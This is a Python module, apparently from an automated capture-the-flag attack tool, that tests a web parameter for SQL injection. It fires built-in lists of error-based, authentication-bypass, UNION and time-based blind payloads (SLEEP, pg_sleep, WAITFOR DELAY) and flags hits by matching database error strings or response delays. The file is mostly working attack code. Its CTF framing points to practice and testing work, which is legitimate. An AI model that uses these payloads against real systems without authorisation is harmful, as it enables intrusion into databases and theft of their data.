"""
SQL Injection attack module.
Covers: error-based, boolean-based blind, time-based blind, union-based.
"""
from __future__ import annotations
import time

from attacks.base import BaseAttack
from engine.flag_hunter import has_definite_flag
from rich.console import Console

console = Console()

ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "ora-0", "pg_query", "sqlite_",
    "mssql", "microsoft sql", "syntax error", "unclosed quotation",
    "you have an error in your sql", "warning: mysql", "division by zero",
    "supplied argument is not a valid mysql", "column count doesn't match",
    "unknown column", "table or view does not exist", "quoted string not properly terminated",
]

TIME_PAYLOADS = [
    "' AND SLEEP(3)--",
    "' AND pg_sleep(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "1 AND SLEEP(3)--",
    "1; SELECT pg_sleep(3)--",
]

ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "1' AND 1=CONVERT(int, @@version)--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' UNION SELECT null--",
    "' UNION SELECT null,null--",
    "' UNION SELECT null,null,null--",
]


class SQLiAttack(BaseAttack):
    name = "sqli"

    async def run(self, attack_point: dict, payloads: list[str]) -> list[dict]:
        url = attack_point["url"]
        param = attack_point.get("param")
        method = attack_point.get("method", "GET")

        if not param:
            return []

        console.print(f"  [cyan][SQLi][/cyan] {method} {url} ?{param}")

        all_findings = []
        seen = set(payloads or [])
        extra = [p for p in ERROR_PAYLOADS if p not in seen]
        combined_payloads = list(payloads or []) + extra

        error_confirmed = False
        for payload in combined_payloads:
            if self._should_stop():
                break

            response, findings = await self._try_payload(method, url, param, payload)
            if response is None:
                continue

            body_lower = response.text.lower()
            is_error_based = any(sig in body_lower for sig in ERROR_SIGNATURES)

            if is_error_based and not error_confirmed:
                error_confirmed = True
                console.print(f"  [bold red][SQLi][/bold red] Error-based hit! Payload: {payload!r}")
                all_findings.append({
                    "type": "sqli_error",
                    "value": f"Error-based SQLi @ {url} param={param} payload={payload!r}",
                    "confidence": 0.9,
                })

            flag_findings = [f for f in findings if f.get("confidence", 0) >= 1.0]
            if flag_findings:
                all_findings.extend(flag_findings)
                flag = has_definite_flag(flag_findings)
                if flag:
                    console.print(f"  [bold green][SQLi][/bold green] FLAG: {flag}")
                    self.stop_event.set()
                    return all_findings

            if error_confirmed:
                break

        if not error_confirmed:
            for time_payload in TIME_PAYLOADS:
                if self._should_stop():
                    break
                t0 = time.monotonic()
                response, findings = await self._try_payload(method, url, param, time_payload)
                elapsed = time.monotonic() - t0

                if elapsed >= 2.8:
                    console.print(
                        f"  [bold red][SQLi][/bold red] Time-based hit! "
                        f"({elapsed:.1f}s) Payload: {time_payload!r}"
                    )
                    all_findings.append({
                        "type": "sqli_time_based",
                        "value": f"Time-based SQLi ({elapsed:.1f}s) @ {url} param={param}",
                        "confidence": 0.85,
                    })
                    break

        return all_findings
